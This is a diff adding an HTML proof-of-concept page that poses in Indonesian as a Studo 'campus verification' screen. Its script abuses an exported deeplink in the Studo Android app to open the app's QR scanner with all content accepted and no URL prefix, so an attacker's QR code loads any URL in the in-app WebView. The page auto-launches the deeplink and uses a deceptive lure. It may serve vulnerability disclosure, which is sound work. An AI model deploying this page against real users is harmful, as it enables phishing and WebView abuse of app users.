@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Studo • Verifikasi Kampus</title>
+<style>
+  html,body{height:100%}
+  body{font-family:-apple-system,Roboto,Segoe UI,Arial,sans-serif;margin:0;background:#0a7d4b;color:#fff;
+       display:flex;min-height:100vh;align-items:center;justify-content:center;text-align:center}
+  .card{background:#fff;color:#15243a;max-width:340px;width:88%;padding:28px 22px;border-radius:16px;
+        box-shadow:0 10px 40px rgba(0,0,0,.25)}
+  h1{font-size:20px;margin:6px 0 4px}
+  p{font-size:14px;color:#54627a;line-height:1.45}
+  .logo{width:54px;height:54px;border-radius:14px;background:#0a7d4b;margin:0 auto 10px;
+        display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:24px}
+  button{margin-top:18px;width:100%;padding:14px;border:0;border-radius:10px;background:#0a7d4b;color:#fff;
+         font-size:16px;font-weight:600}
+  .hint{margin-top:14px;font-size:12px;color:#8a96a8}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">S</div>
+    <h1>Verifikasi Kampus</h1>
+    <p>Untuk melanjutkan, buka pemindai Studo lalu pindai kode QR verifikasi yang ditampilkan petugas.</p>
+    <button id="go">Buka Pemindai Studo</button>
+    <div class="hint">Anda akan diarahkan ke aplikasi Studo.</div>
+  </div>
+
+<script>
+/* === PoC: a web page (works over https / GitHub Pages) forces the Studo app to open its
+   generic QR scanner in attacker-controlled mode, via the exported BROWSABLE deeplink. ===
+   qrCodeRegex=.*        -> scanner accepts ANY scanned content
+   qrScanUrlPrefix=(empty)-> WebFragment.open("" + scannedQR) loads the scanned URL verbatim
+   The victim then scans the attacker's URL QR -> arbitrary URL opens in the in-app WebView. */
+
+var PATH  = "v1?startScreen=qrCodeScanner&qrCodeRegex=.*&qrScanUrlPrefix=";
+var SCHEME = "moshbitstudo://" + PATH;
+// Chrome on Android launches app intents most reliably via intent:// (with package pinned).
+var INTENT = "intent://" + PATH + "#Intent;scheme=moshbitstudo;package=com.moshbit.studo;end";
+
+function isAndroidChrome(){
+  var ua = navigator.userAgent || "";
+  return /Android/.test(ua) && /Chrome\//.test(ua) && !/(SamsungBrowser|EdgA|OPR|Firefox|YaBrowser)/.test(ua);
+}
+
+function fire(){
+  // Pick the most reliable launcher for the current browser.
+  window.location.href = isAndroidChrome() ? INTENT : SCHEME;
+}
+
+// 1) User-gesture launch — most reliable across mobile browsers.
+document.getElementById('go').addEventListener('click', fire);
+
+// 2) Best-effort auto-launch shortly after load (allowed on some browsers).
+setTimeout(function(){ try { fire(); } catch (e) {} }, 800);
+</script>
+</body>
+</html>
